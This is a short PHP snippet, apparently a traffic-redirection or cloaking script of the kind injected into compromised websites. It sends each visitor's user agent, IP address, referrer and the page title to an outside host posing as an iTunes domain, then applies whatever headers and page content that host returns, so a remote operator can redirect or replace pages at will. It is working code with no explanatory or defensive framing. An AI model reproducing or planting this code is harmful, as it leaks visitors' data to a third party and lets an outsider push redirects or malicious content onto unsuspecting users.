<?php
$apiKey = 'a82a0233b150c76e7d4cdc479c6ec168';
$campaignId = 'qgcbb8';
$keyword = urlencode($thisPage['title']);
$ua = urlencode($_SERVER['HTTP_USER_AGENT']);
$ip = urlencode($_SERVER['REMOTE_ADDR']);
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = urlencode($_SERVER['HTTP_X_FORWARDED_FOR']);
} else {
    $ip = urlencode($_SERVER['REMOTE_ADDR']);
}
$referrer = urlencode($_SERVER['HTTP_REFERER']);
$url = "http://api.itunes-ru.ru/api.php?action=get&api_key=$apiKey&campaign=$campaignId&ua=$ua&ip=$ip&keyword=$keyword&referrer=$referrer";
$result = json_decode(file_get_contents($url));
if ($result->redirect) {
  foreach($result->redirect->headers as $header) {
    header($header);
  }
if ($result->redirect->content) {
     echo urldecode($result->redirect->content);
}
}
?>
